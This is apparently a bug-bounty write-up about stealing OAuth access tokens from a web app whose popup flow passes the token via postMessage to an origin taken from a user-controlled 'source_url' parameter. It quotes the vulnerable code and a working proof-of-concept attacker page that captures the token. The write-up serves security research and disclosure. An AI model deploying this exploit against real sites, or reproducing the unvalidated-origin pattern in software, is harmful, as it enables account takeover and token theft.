# Client-Side Logic Flaw: Stealing OAuth Access Tokens via postMessage
<img width="284" height="689" alt="image" src="https://github.com/user-attachments/assets/8802e207-3219-4dbe-8d33-8908d04368bd" />


One of the most interesting attack vectors in web hunting is uncovering logical flaws in cross-window communication (`postMessage`). When a web application utilizes popups or modern OAuth flows for authentication, failing to properly validate target origins can turn an isolated component into a flawless token hijacking pipeline.

This writeup details a real-world scenario where the lack of origin filtering on dynamic inputs allowed for the clean extraction of session access tokens.

## Client-Side Code Analysis: Secure Redirect vs. Vulnerable Popup

During the code review, I discovered that the application handled communication through two distinct flows: the first was a secure frame/redirect flow utilizing a hardcoded whitelist, whereas the second was an authentication popup flow that trusted user-controlled parameters.

### Phase 1: Secure Redirect (Whitelist Enforcement)

In this safe portion of the script, the application defines an explicit array of trusted domains. It blocks any data transmission unless the receiver's origin is authenticated against this list:

```javascript
// [1] An explicit, hardcoded whitelist of the system's trusted origins.
n = ["localhost", "subtarget.target.io", "target2.target.io", "target3.target.com", "subtarget.target.com"],
```

### Phase 2: Vulnerable Code (Unfiltered Popup Communication)
However, when managing the popup authentication sequence, the application entirely bypasses the whitelist logic. Instead of validating where it sends data, it grabs the destination origin directly from the client's page environment:
```javascript
try {
    // [1] Reading the window opener's URL fails under Same-Origin Policy (SOP), forcing a DOMException
    r = window.opener.location.href || $("#source_url").val()
} catch (n) {
    // [2] Logic Flaw: The application falls back directly to the untrusted user input
    r = $("#source_url").val()
}

// [3] Final Leakage: The sensitive access token is dispatched to the unvalidated origin (r)
return window.opener.postMessage(t, r)
```
#Exploit Code (PoC Attack)

To exploit this architectural breakdown, we host a minimalist script on our malicious origin. The script automatically feeds our domain into the source_url parameter and listens for the inbound token:

```javascript
window.addEventListener("message", function(e) {
    if (e.data?.startsWith("logged_in:")) {
        // [1] Clean and extract the token parameters from the leaked fragment identifier
        const url = new URL(e.data.replace("logged_in:", ""));
        const hash = new URLSearchParams(url.hash.slice(1));
        alert("Token Captured: " + hash.get("access_token"));
    }
}, false);

// [2] Force the application to use our origin as the targetOrigin fallback
var url = "https://target.com/picasa?source_url=" + encodeURIComponent(location.origin);
window.open(url, "popup", "width=800,height=600");
```
<img width="1194" height="696" alt="image" src="https://github.com/user-attachments/assets/f623d8d1-0a26-4487-acd9-ab81db03d8a5" />
